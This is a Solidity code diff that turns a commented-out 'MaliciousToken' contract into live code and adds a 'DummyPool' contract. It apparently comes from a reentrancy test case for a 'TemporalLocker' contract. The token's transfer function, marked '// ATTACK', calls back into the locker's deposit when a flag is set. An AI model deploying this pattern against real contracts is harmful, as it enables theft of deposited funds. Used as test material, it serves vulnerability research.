@@ -39,33 +39,48 @@ contract TemporalLocker_ree1 {
     }
 }
 
-// contract MaliciousToken is IERC20 {
-//     mapping (address => uint) public balances;
-//     bool public condition;
-//     Locker public locker;
+contract DummyPool {
+    mapping(address => uint) public fees;
 
-//     constructor(address _locker) {
-//         locker = Locker(_locker);
-//     }
+    function dummySwap() public {
+        // perform some swap logic
+        fees[msg.sender] += 1;
+    }
 
-//     function safeTransfer(address to, uint amt) public {
-//         safeTransferFrom(msg.sender, to, amt);
-//     }
+    function withdrawFee(address token) public {
+        uint amt = fees[msg.sender];
+        fees[msg.sender] = 0;
+        IERC20(token).safeTransferFrom(address(this), msg.sender, amt);
+    }
+}
 
-//     function safeTransferFrom(address from, address to, uint amt) public {
-//         // ATTACK
-//         if (condition) {
-//             locker.deposit(address(this), amt);
-//         }
-//         balances[to] += amt;
-//         balances[from] -= amt;
-//     }
+contract MaliciousToken is IERC20 {
+    mapping(address => uint) public balances;
+    bool public condition;
+    TemporalLocker_ree1 public locker;
 
-//     function balanceOf(address a) public view returns (uint256){
-//         return balances[a];
-//     }
+    constructor(address _locker) {
+        locker = TemporalLocker_ree1(_locker);
+    }
 
-//     function setCondition(bool _condition) public {
-//         condition = _condition;
-//     }
-// }
+    function safeTransfer(address to, uint amt) public {
+        safeTransferFrom(msg.sender, to, amt);
+    }
+
+    function safeTransferFrom(address from, address to, uint amt) public {
+        // ATTACK
+        if (condition) {
+            locker.deposit(address(this), amt);
+        }
+        balances[to] += amt;
+        balances[from] -= amt;
+    }
+
+    function balanceOf(address a) public view returns (uint256) {
+        return balances[a];
+    }
+
+    function setCondition(bool _condition) public {
+        condition = _condition;
+    }
+}
